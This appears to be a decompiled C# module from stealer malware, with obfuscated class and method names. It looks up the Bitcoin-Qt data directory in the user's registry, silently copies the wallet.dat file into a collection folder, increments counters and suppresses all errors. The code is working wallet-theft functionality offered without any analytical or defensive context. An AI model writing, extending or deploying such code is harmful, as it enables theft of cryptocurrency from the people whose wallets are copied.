using System.IO;
using Microsoft.Win32;

internal class Class62
{
	public static int int_0;

	public static void smethod_0(string string_0)
	{
		try
		{
			RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("Software")!.OpenSubKey("Bitcoin")!.OpenSubKey("Bitcoin-Qt");
			Directory.CreateDirectory(string_0 + "\\Wallets\\BitcoinCore\\");
			File.Copy(registryKey!.GetValue("strDataDir")!.ToString() + "\\wallet.dat", string_0 + "\\BitcoinCore\\wallet.dat");
			int_0++;
			Class36.int_12++;
		}
		catch
		{
		}
	}
}
